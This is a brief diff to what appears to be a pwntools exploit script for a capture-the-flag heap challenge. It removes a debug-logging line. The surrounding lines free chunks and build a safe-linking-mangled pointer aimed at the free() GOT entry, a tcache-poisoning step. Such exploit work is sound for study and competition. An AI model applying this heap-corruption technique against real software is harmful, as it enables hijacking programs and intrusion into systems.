@@ -101,8 +101,6 @@ io.recvuntil(b"WINNER")
 for i in range(5):
     rm(i)
 
-context.log_level = 'DEBUG'
-
 payload = p64(mangle(heap, elf.got["free"] - 0x8)) + b"\xff"
 cheat(4, payload, 4)
 
